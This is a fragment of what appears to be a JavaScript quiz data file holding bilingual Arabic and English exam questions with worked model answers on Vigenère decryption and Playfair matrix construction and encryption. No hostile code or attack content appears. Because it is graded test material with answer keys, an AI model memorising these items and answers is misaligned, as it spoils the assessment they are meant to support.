        "الناتج: HELLO\n\nفك فيجينير عكس التشفير: P = (C - K) mod 26 — نطرح حرف المفتاح بدل أن نضيفه:\nR (17) - K (10) = 7 ← H\nI (8) - E (4) = 4 ← E\nW (22) - L (11) = 11 ← L\nV (21) - K (10) = 11 ← L\nS (18) - E (4) = 14 ← O\n\n(لو صارت النتيجة سالبة نضيف 26 — لن يحدث هنا لكن تذكرها للأمان)\n\nهذا هو عكس التدريب السابق تماماً: نفس الأرقام باتجاه معاكس. تمرّن على الوجهين لأن الاختبار قد يعطيك المشفر ويطلب الأصلي أو العكس.\n\nقاعدة اتجاه لا تكسرها: تشفير = جمع (+)، فك = طرح (-)، في قيصر وفي فيجينير على السواء.",
    },
    {
      n: 29,
      type: "essay",
      ref: "L6-S010",
      q_ar: "ابنِ مصفوفة Playfair للمفتاح PLAYFAIR، ثم اذكر القواعد الأربع لتشفير أي زوج حروف (Digraph).",
      q_en: "Build the Playfair 5x5 matrix for the keyword PLAYFAIR, then state the four digraph encryption rules.",
      ans_ar:
        "المصفوفة (J تدمج مع I فلا وجود لها):\nالصف 1: P L A Y F\nالصف 2: I R B C D\nالصف 3: E G H K M\nالصف 4: N O Q S T\nالصف 5: U V W X Z\n\nالبناء: اكتب حروف المفتاح بلا تكرار (P,L,A,Y,F,I,R) ثم أكمل ببقية الأبجدية (B,C,D,E,G,H,K,M,N,O,Q,S,T,U,V,W,X,Z) — حذف J لأنها تدمج مع I. النتيجة 25 خانة في شبكة 5×5.\n\nالقواعد الأربع لكل زوج:\n1) نفس الصف: كل حرف يُستبدل بما على يمينه (وآخر عمود يلف لأول العمود).\n2) نفس العمود: كل حرف يُستبدل بما تحته (وآخر صف يلف لأول الصف).\n3) مستطيل (لا صف ولا عمود مشترك): كل حرف يُستبدل بحرف صفه وعمود الآخر.\n4) قبل كل هذا — تجهيز النص: زوج من حرفين متطابقين؟ أدخل X بينهما. طول فردي؟ أضف X في النهاية.\n\nفي الاختبار: بناء المصفوفة نصف العلامة — احفظ أن I/J خانة واحدة وأن الحشو بـX.",
    },
    {
      n: 30,
      type: "essay",
      ref: "L6-S010",
      q_ar: "بمصفوفة Playfair للمفتاح MONARCHY (الصفوف: M O N A R / C H Y B D / E F G I K / L P Q S T / U V W X Z) شفّر كلمة BALLOON. اعرض تفكيك الأزواج وكل حالة قاعدة.",
      q_en: "Using the Playfair matrix for keyword MONARCHY, encrypt BALLOON. Show the digraph splitting and which rule each pair triggers.",
      ans_ar:
        "الناتج: IBSUPMNA\n\nأولاً تجهيز النص: B A L L O O N ← الزوج الثالث (L,L) حرفان متطابقان فنفصل بينهما بـX: BA - LX - LO - ON\n\nالآن تشفير كل زوج:\nBA: B في الصف2العمود4 وA في الصف1العمود4 — نفس العمود ← كل حرف يُستبدل بما تحته: B ← I (تحته في الصف3)، A ← B (تحته في الصف2). الناتج: IB\n\nLX: L في الصف4العمود1 وX في الصف5العمود4 — مستطيل ← كل حرف لصفه وعمود رفيقه: L ← S (الصف4العمود4)، X ← U (الصف5العمود1). الناتج: SU\n\nLO: L في الصف4العمود1 وO في الصف1العمود2 — مستطيل: L ← P (الصف4العمود2)، O ← M (الصف1العمود1). الناتج: PM\n\nON: O وN في الصف1 معاً — نفس الصف ← كل حرف لما على يمينه: O ← N، N ← A. الناتج: NA\n\nالمجموع: IB + SU + PM + NA = IBSUPMNA\n\nهذا التمرين يغطي القواعد الأربع دفعة واحدة: الحرف المتطابق (X)، نفس العمود، المستطيل، نفس الصف — لذلك تمرّن عليه حتى يصبح آلياً.",
    },
  ],
});
